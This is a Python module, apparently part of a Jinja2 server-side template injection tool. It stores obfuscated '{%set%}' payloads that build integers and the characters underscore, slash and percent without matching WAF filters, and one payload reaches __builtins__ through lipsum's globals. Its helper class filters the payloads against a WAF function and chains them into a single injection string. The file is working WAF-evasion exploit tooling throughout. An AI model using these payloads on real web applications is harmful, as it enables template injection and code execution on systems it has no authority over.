"""提供上下文的payload, 为最终的payload提供一系列变量

"""

from typing import Iterable, Dict, Any, Callable, Union
import logging

logger = logging.getLogger("context_vars")

# 所有的上下文payload, 存储格式为: {payload: {变量名：变量值}}

Context = Dict[str, Any]
ContextPayloads = Dict[str, Context]
Waf = Callable[[str], bool]

# 所有上下文的payload, 变量名不能重复
context_payloads_all: ContextPayloads = {
    "{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}"
    + "{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}": {
        "oa": 0,
        "la": 1,
        "lla": 11,
        "llla": 111,
        "lllla": 1111,
    },
    "{%set ob={}|int%}{%set lb=ob**ob%}{%set llb=(lb~lb)|int%}"
    + "{%set lllb=(llb~lb)|int%}{%set llllb=(lllb~lb)|int%}"
    + "{%set bb=llb-lb-lb-lb-lb-lb%}{%set sbb=lllb-llb-llb-llb-llb-llb%}"
    + "{%set ssbb=llllb-lllb-lllb-lllb-lllb-lllb%}"
    + "{%set zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%}": {
        "ob": 0,
        "lb": 1,
        "llb": 11,
        "lllb": 111,
        "llllb": 1111,
        "bb": 6,
        "sbb": 56,
        "ssbb": 556,
        "zzeb": 223,
    },
    "{%set zols=lipsum|escape|urlencode|list|escape|urlencode|count%}": {"zols": 2015},
    "{%set ltr={}|escape|urlencode|list|escape|urlencode|count%}": {"ltr": 178},
    "{%set lea=namespace|escape|urlencode|escape|"
    + "urlencode|urlencode|urlencode|count%}": {"lea": 134},
    "{%set lel=cycler|escape|urlencode|escape|urlenc"
    + "ode|escape|urlencode|escape|urlencode|count%}": {"lel": 131},
    "{%set qo=namespace|escape|urlencode|escape|urlencode|count%}": {"qo": 90},
    "{%set bs=cycler|escape|urlencode|count%}": {"bs": 65},
    "{%set ab=namespace|escape|count%}": {"ab": 46},
    "{%set zb={}|escape|list|escape|count%}": {"zb": 26},
    "{%set t=joiner|urlencode|wordcount%}": {"t": 7},
    "{%set b={}|escape|urlencode|count%}": {"b": 6},
    "{%set e=(dict(a=x,b=x,c=x)|count)%}": {"e": 3},
    "{%set l={}|escape|first|count%}": {"l": 1},
    "{%set ndl=({}|select()|trim|list)[24]%}": {"ndl": "_"},
    "{%set ndll={}|select()|trim|list|batch(25)|first|last%}": {"ndll": "_"},
    "{%set ndlll={}|select()|trim|list|attr(dict(po=x,p=x)|join)(24)%}": {"ndlll": "_"},
    "{%set ndr={}|select()|trim|list|batch(25)|first|last%}{%set sls=1|attr"
    + "((ndr,ndr,dict(truediv=x)|join,ndr,ndr)|join)|attr"
    + "((ndr,ndr,dict(doc=x)|join,ndr,ndr)|join)|batch(12)|first|last%}": {
        "ndr": "_",
        "sls": "/",
    },
    "{%set unn=lipsum|escape|batch(22)|list|first|last%}": {"unn": "_"},
    "{%set perc=lipsum()|urlencode|first%}": {"perc": "%"},
    "{%set percc=(lipsum[((({}|select()|trim|list)[24]))*2+"
    + "dict(globals=x)|join+((({}|select()|trim|list)[24]))*2][((({}|select()"
    + "|trim|list)[24]))*2+dict(builtins=x)|join+((({}|select()|trim|list"
    + ")[24]))*2][dict(chr=x)|join](37))%}": {"percc": "%"},
    "{%set perccc=({0:1}|safe).replace((1|safe).rjust(2),"
    + "cycler.__name__|batch(3)|first|last).format(((9,9,9,1,9)|sum))%}": {
        "perccc": "%"
    },
    "{%set prrc=((dict(dict(dict(a=1)|tojson|batch(2),)|batch(2),)|join,"
    + "dict(c=x)|join,dict()|trim|last)|join).format((9,9,9,1,9)|sum)%}": {"prrc": "%"},
    "{%set prrrc=1.__mod__.__doc__.__getitem__(11)%}": {"prrrc": "%"},
}


def filter_by_waf(
    context_payloads: ContextPayloads, waf: Callable[[str], bool]
) -> ContextPayloads:
    """根据WAF函数去除所有不能通过WAF的payload

    Args:
        context_payloads (ContextPayloads): 需要过滤的ContextPayload
        waf (Callable[[str], bool]): WAF函数，

    Returns:
        ContextPayloads: 过滤后的ContextPayload
    """
    return {payload: d for payload, d in context_payloads.items() if waf(payload)}


def filter_by_used_context(
    context_payloads: ContextPayloads, used_context: Iterable
) -> ContextPayloads:
    """根据已经使用的变量列表过滤上下文payload

    Args:
        context_payloads (ContextPayloads): 需要过滤的ContextPayload
        used_context (Iterable): 使用的变量名

    Returns:
        ContextPayloads: 过滤后的ContextPayloads
    """
    return {
        payload: d
        for payload, d in context_payloads.items()
        if any(var_name in used_context for var_name in d.keys())
    }


class ContextVariableUtil:
    """管理上下文变量payload的工具类
    这个类管理类似{%set xxx%}的payload以及其对应的变量名与值
    """

    def __init__(self, waf: Waf, context_payloads: ContextPayloads):
        self.waf = waf
        self.context_payloads = context_payloads.copy()
        self.payload_dependency = {}
        self.prepared = False

    def filter_by_waf(self, waf: Union[Waf, None] = None):
        """根据WAF函数过滤context payload

        Args:
            waf (Union[Waf, None], optional): 用于过滤的waf函数，默认使用init传入的waf函数. Defaults to None.
        """
        if waf is None:
            waf = self.waf
        self.context_payloads = filter_by_waf(self.context_payloads, self.waf)

    def do_prepare(self):
        """准备函数，会被自动调用"""
        self.filter_by_waf()
        self.prepared = True

    def is_variable_exists(self, var_name: str) -> bool:
        """返回变量是否存在

        Args:
            var_name (str): 变量名

        Returns:
            bool: 是否存在
        """
        all_vars = set(v for d in self.context_payloads.values() for v in d)
        return var_name in all_vars

    def add_payload(
        self,
        payload: str,
        variables: Context,
        depends_on: Union[Context, None] = None,
        check_waf: bool = True,
    ) -> bool:
        """将payload加入context payloads中

        Args:
            payload (str): 需要加入的payload
            variables (Context): payload中存储的一系列变量，不能和已有的重复
            depends_on (Union[Context, None], optional): payload依赖的变量. Defaults to None.
            check_waf (bool, optional): 是否使用waf函数检查payload是否合法. Defaults to True.

        Returns:
            bool: 是否加入成功
        """
        if not self.prepared:
            self.do_prepare()
        if check_waf and not self.waf(payload):
            return False
        if any(self.is_variable_exists(v) for v in variables):
            logger.warning("Variable exists!")
            return False
        if depends_on is not None:
            if not all(self.is_variable_exists(v) for v in depends_on):
                notfound_vars = [v for v in depends_on if not self.is_variable_exists(v)]
                logger.warning("Variables not found: %s", repr(notfound_vars))
                return False
            self.payload_dependency[payload] = depends_on
        self.context_payloads[payload] = variables
        return True

    def get_payload(self, used_context: Context = None):
        if not self.prepared:
            self.do_prepare()
        answer = ""
        to_add_vars = list(used_context.keys())
        added_vars = set()
        while to_add_vars:
            to_add = to_add_vars.pop(0)

            if to_add in added_vars:
                continue
            if not self.is_variable_exists(to_add):
                raise RuntimeError(f"Variable {to_add} not found")

            payload = next(payload for payload, d in self.context_payloads.items() if to_add in d)
            if payload in self.payload_dependency:
                # 检测依赖的变量是否都加入了
                vars_name = list(self.payload_dependency[payload].keys())
                assert all(self.is_variable_exists(v) for v in vars_name)
                if not all(v in added_vars for v in vars_name):
                    to_add_vars += list(self.payload_dependency[payload])
                    to_add_vars.append(to_add)
                    continue

            answer += payload
            added_vars.add(to_add)
        return answer

    def get_context(self) -> Context:
        return {
            var_name: var_value
            for _, d in self.context_payloads.items()
            for var_name, var_value in d.items()
        }

